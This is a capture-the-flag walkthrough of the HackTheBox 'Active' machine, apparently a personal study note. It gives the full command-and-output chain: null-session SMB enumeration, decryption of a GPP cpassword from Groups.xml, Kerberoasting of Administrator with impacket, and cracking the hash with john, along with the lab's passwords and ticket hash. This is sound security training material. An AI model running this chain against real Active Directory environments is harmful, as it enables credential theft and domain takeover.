---
{"dg-publish":true,"permalink":"/ct-fs/htb/active/","dgShowFileTree":true,"dg-note-properties":{}}
---

#windows #leaked_creds #smb #nxc #kerberoasting  #ldap #bloodhound


## Recon
![active.png.png](/img/user/CTFs/HTB/Images/Active%20Images/active.png.png)

### Nmap:
```zsh
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49157,49155,49166,49162,49154,49158,49169,49153 -sV -sC -T4 -Pn -oA 10.129.126.130 10.129.126.130
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-07 13:16 -0400
Nmap scan report for 10.129.126.130
Host is up (0.092s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-07 17:16:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-07T17:17:40
|_  start_date: 2026-10-07T17:13:57
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
|_clock-skew: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.01 seconds
```
Initial port scanning shows a common suite of windows ports including DNS, Kerb, SMB, ldap, msrpc, winrm and .NET message framing as well as RPC. We also see it appears to be a Windows Server 2008 R2 SP1 server with the domain `active.htb`. Adding to our `/etc/hosts` file.

## Initial Access (leaked credentials)
### Port 445 (SMB)
#### NXC
```zsh
└─$ nxc smb active.htb -u '' -p '' --shares
SMB         10.129.126.130  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.126.130  445    DC               [+] active.htb\: 
SMB         10.129.126.130  445    DC               [*] Enumerated shares
SMB         10.129.126.130  445    DC               Share           Permissions     Remark
SMB         10.129.126.130  445    DC               -----           -----------     ------
SMB         10.129.126.130  445    DC               ADMIN$                          Remote Admin
SMB         10.129.126.130  445    DC               C$                              Default share
SMB         10.129.126.130  445    DC               IPC$                            Remote IPC
SMB         10.129.126.130  445    DC               NETLOGON                        Logon server share 
SMB         10.129.126.130  445    DC               Replication     READ            
SMB         10.129.126.130  445    DC               SYSVOL                          Logon server share 
SMB         10.129.126.130  445    DC               Users

└─$ nxc smb DC.active.htb -u 'Guest' -p '' --shares
SMB         10.129.126.130  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.126.130  445    DC               [-] active.htb\Guest: STATUS_ACCOUNT_DISABLED
```
Checking for null and Guest access on SMB we do find null access is available with read access to a share called `Replication`, but the Guest user has been disabled. Additionally we see that the hostname for the machine is `DC` so we'll update our hosts file to include that as well.

##### Spider Plus

```zsh
└─$ nxc smb DC.active.htb -u '' -p '' -M spider_plus
/usr/lib/python3/dist-packages/lsassy/impacketfile.py:90: SyntaxWarning: 'return' in a 'finally' block
  return True
SMB         10.129.126.130  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.126.130  445    DC               [+] active.htb\: 
SPIDER_PLUS 10.129.126.130  445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.126.130  445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.126.130  445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.126.130  445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.126.130  445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.126.130  445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.126.130  445    DC               [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.129.126.130  445    DC               [*] Enumerated shares
SMB         10.129.126.130  445    DC               Share           Permissions     Remark
SMB         10.129.126.130  445    DC               -----           -----------     ------
SMB         10.129.126.130  445    DC               ADMIN$                          Remote Admin
SMB         10.129.126.130  445    DC               C$                              Default share
SMB         10.129.126.130  445    DC               IPC$                            Remote IPC
SMB         10.129.126.130  445    DC               NETLOGON                        Logon server share 
SMB         10.129.126.130  445    DC               Replication     READ            
SMB         10.129.126.130  445    DC               SYSVOL                          Logon server share 
SMB         10.129.126.130  445    DC               Users                           
SPIDER_PLUS 10.129.126.130  445    DC               [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.126.130.json".
SPIDER_PLUS 10.129.126.130  445    DC               [*] SMB Shares:           7 (ADMIN$, C$, IPC$, NETLOGON, Replication, SYSVOL, Users)
SPIDER_PLUS 10.129.126.130  445    DC               [*] SMB Readable Shares:  1 (Replication)
SPIDER_PLUS 10.129.126.130  445    DC               [*] Total folders found:  22
SPIDER_PLUS 10.129.126.130  445    DC               [*] Total files found:    7
SPIDER_PLUS 10.129.126.130  445    DC               [*] File size average:    1.16 KB
SPIDER_PLUS 10.129.126.130  445    DC               [*] File size min:        22 B
SPIDER_PLUS 10.129.126.130  445    DC               [*] File size max:        3.63 KB

┌──(kali㉿kali)-[~/CTF/HTB/active/scanning]
└─$ cat /home/kali/.nxc/modules/nxc_spider_plus/10.129.126.130.json| jq   
{
  "Replication": {
    "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
      "atime_epoch": "2018-07-21 06:37:44",
      "ctime_epoch": "2018-07-21 06:37:44",
      "mtime_epoch": "2018-07-21 06:38:11",
      "size": "23 B"
    },
    "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI": {
      "atime_epoch": "2018-07-21 06:37:44",
      "ctime_epoch": "2018-07-21 06:37:44",
      "mtime_epoch": "2018-07-21 06:38:11",
      "size": "119 B"
    },
    "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
      "atime_epoch": "2018-07-21 06:37:44",
      "ctime_epoch": "2018-07-21 06:37:44",
      "mtime_epoch": "2018-07-21 06:38:11",
      "size": "1.07 KB"
    },
    "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml": {
      "atime_epoch": "2018-07-21 06:37:44",
      "ctime_epoch": "2018-07-21 06:37:44",
      "mtime_epoch": "2018-07-21 06:38:11",
      "size": "533 B"
    },
    "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
      "atime_epoch": "2018-07-21 06:37:44",
      "ctime_epoch": "2018-07-21 06:37:44",
      "mtime_epoch": "2018-07-21 06:38:11",
      "size": "2.72 KB"
    },
    "active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
      "atime_epoch": "2018-07-21 06:37:44",
      "ctime_epoch": "2018-07-21 06:37:44",
      "mtime_epoch": "2018-07-21 06:38:11",
      "size": "22 B"
    },
    "active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
      "atime_epoch": "2018-07-21 06:37:44",
      "ctime_epoch": "2018-07-21 06:37:44",
      "mtime_epoch": "2018-07-21 06:38:11",
      "size": "3.63 KB"
    }
  }
}
```
Next I used the Netexec Module called `Spider Plus` to recursively search all readable shares to our current session (Null in this case) and we see basic INI files and informational files but we do spy a `Groups.xml` file. This may leak valid Domain groups on the server so let's try and pull it down with `smbclient`

##### Downloading Groups.xml
```zsh
smb: \active.htb\policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml 
getting file \active.htb\policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)

└─$ cat Groups.xml                                                        
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
What we find is actually an xml file which seems to have hardcoded creds for the `SVC_TGS` user on this domain. This could be a Ticket Granting Service account used throughout. Let's see if the password mentioned works as their domain password. We know that since this is a `Group.xml` file, it is encrypted using a commonly known AES-256 encryption key. To decode this kali has a built-in tool called `gpp-decrypt`.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/active/scanning]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```
And just like that we get the plaintext password for the account.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/active/scanning]
└─$ nxc smb DC.active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
SMB         10.129.126.130  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.126.130  445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.129.126.130  445    DC               [*] Enumerated shares
SMB         10.129.126.130  445    DC               Share           Permissions     Remark
SMB         10.129.126.130  445    DC               -----           -----------     ------
SMB         10.129.126.130  445    DC               ADMIN$                          Remote Admin
SMB         10.129.126.130  445    DC               C$                              Default share
SMB         10.129.126.130  445    DC               IPC$                            Remote IPC
SMB         10.129.126.130  445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.126.130  445    DC               Replication     READ            
SMB         10.129.126.130  445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.126.130  445    DC               Users           READ 
```
We confirm the creds are working as well as notice we have READ access to multiple shares including `Users`.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/active/scanning]
└─$ smbclient -U 'active.htb/SVC_TGS%GPPstillStandingStrong2k18' \\\\DC.active.htb\\Users
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

		5217023 blocks of size 4096. 284703 blocks available
smb: \> cd SVC_TGS
smb: \SVC_TGS\> dir
  .                                   D        0  Sat Jul 21 11:16:32 2018
  ..                                  D        0  Sat Jul 21 11:16:32 2018
  Contacts                            D        0  Sat Jul 21 11:14:11 2018
  Desktop                             D        0  Sat Jul 21 11:14:42 2018
  Downloads                           D        0  Sat Jul 21 11:14:23 2018
  Favorites                           D        0  Sat Jul 21 11:14:44 2018
  Links                               D        0  Sat Jul 21 11:14:57 2018
  My Documents                        D        0  Sat Jul 21 11:15:03 2018
  My Music                            D        0  Sat Jul 21 11:15:32 2018
  My Pictures                         D        0  Sat Jul 21 11:15:43 2018
  My Videos                           D        0  Sat Jul 21 11:15:53 2018
  Saved Games                         D        0  Sat Jul 21 11:16:12 2018
  Searches                            D        0  Sat Jul 21 11:16:24 2018

		5217023 blocks of size 4096. 284703 blocks available
smb: \SVC_TGS\> cd Desktop
smb: \SVC_TGS\Desktop\> dir
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                           AR       34  Wed Oct  7 13:14:56 2026


```
From there we access the share and see it as the active listing for the Users folder on the server including our own user's Desktop where `user.txt` is waiting for us.

## Privilege Escalation
### 389 LDAP & 88 (Kerberoast)
#### Bloodhound
![bloodhound.png.png](/img/user/CTFs/HTB/Images/Active%20Images/bloodhound.png.png)
I pulled Bloodhound loot and ran some basic queries to discover that the Administrator user is kerberoastable. This may provide a Privesc pathway, but their password hash could also be quite strong.

```zsh
┌──(kali㉿kali)-[~/…/HTB/active/files/bloodhound]
└─$ impacket-GetUserSPNs -request -dc-ip 10.129.126.130 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -outputfile kerb_hashes.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-10-07 13:14:59.866546             



[-] CCache file is not found. Skipping...
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/HTB/active/files/bloodhound]
└─$ cat kerb_hashes.txt 
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$884d8ee0b3dc769ceda1e6f48fb0b411$80467f51f54f1bd499e0a924075b24cfb620d3045e94576808f14a9c6a9a3f48faaaa72207b29f8dda266306ccdeb9d706060d65de16712404caa421b0e45fc0fc3fecf84c03fb1da6aae2a529f22380037e4c959ee5fad4eda5880c34111db360d8f739a2e007f39131f15d3d4364b3fa90a0e3c43841cc4c0c8320dbc90790c846d7006b0f077ff3b619089c969a400b2c30f3a656b6b70541b0da67cba8ac5d0d74c26c6e7917d70c3fc57c006b1f36e00e958d793ff32f051704db4985ea536f5d77f7a53a4f517b0a1c782b8787796f396320426c870c8f11b16d76c584eaa3b866a12fea53976656b95b4ad0661a23e7668c3319a0d715c07b552383ea3cf1ae0273a054a0e139bd97894390cd18d941d8e1e3d823f90e7bd21d03b06c0fdcf84f0c6290ee6ced3e08fdda87688fe599e3add46000e7ac0d72885d142cddbc604a66b1a3e19926ed9d7005edbbb63d2ad598c2cc1bbb48cfb63e0bf44dfb8ed5799bc61b8163a2d0e89428843fe931a4335f44e1292ddc8ff4ef00a48ffdfb562be38bb1bbb9eaf9bf3f246ec0fd9459c42234a8b9a343fdf8b4c0aab016c4867fce089a50923c1d4818ed2fa9bc23580813c7c39abcba5aa84d8a01a71b30e9ea0d787204e08f6522d42970fd8b2a1ba9f9eb09ca704836a563afe26936448f6431833ebdf20a0ad5678d1aab544a6c6a3888529fda2f7130b41b48d67311a2063e5c97c8997843933f54fb2d187fb7f2a6707070da82c54c1b497c68db964ba60719d7fdd6eb7741a5f8f3f2b181ea182aa2b8766bf8cf451fb049348992178443266d8d068e4b3ad71477f441766c5258b816400f77e2a7dbdceef13b8880876e0c90019b01206433056a9b8852eb4d04c516367ec660a50daa2babf147a3ca8483504e79e7a9f9db5ecbeb7de35bc60555151ff094a6aee692602f8d73eed53f45f6cda27098b02762602383deb758b323d40882db3012f2cfa9c7940531610ce7a3f049d0a83d5226ef58f6eb03b90c086313e375858c297d217959a727aa8eaf703cb69eb593cf73f8fcdf3c997ec2666e62eab05d8d379464e7a6a9d1976a0ab7e87b5a5c48375b0fb572171dc9bd8612b25a545a2c22cb3dd790bebdfe5bd6357a85fa51a27a4921eb596e3fc0f445443dc6b8ee1121325f9a561fd95aee5bb7935f01adce05e88200ad16e05be9005de96ae5ca8c633ba8491a8b645df275a414b7bb8398a806a1db4cc62aae8b77fde17b9c
```
We successfully kerberoast `Administrator` and extract their TGS hash.

```zsh
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt kerb_hashes.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:03 DONE (2026-10-07 14:04) 0.3115g/s 3282Kp/s 3282Kc/s 3282KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
And within seconds we crack the hash for `Administrator's` plaintext password.

```zsh
└─$ smbclient -U 'active.htb/administrator%Ticketmaster1968' \\\\DC.active.htb\\Users
Try "help" to get a list of possible commands.
smb: \> cd Administrator
smb: \Administrator\> cd Desktop
smb: \Administrator\Desktop\> dir
  .                                  DR        0  Thu Jan 21 11:49:47 2021
  ..                                 DR        0  Thu Jan 21 11:49:47 2021
  desktop.ini                       AHS      282  Mon Jul 30 09:50:10 2018
  root.txt                           AR       34  Wed Oct  7 13:14:56 2026

		5217023 blocks of size 4096. 279586 blocks available

```
We successfully authenticate as `Administrator` back in to the Users share on the server via smb and find `root.txt` on their Desktop. Pwned.


> [!Takeaways]
> - Always recursive search the shares you have access to. You never know what's lurking inside.
> - Anytime you see a `cpassword` key:value pair that's a job for `gpp-decrypt`.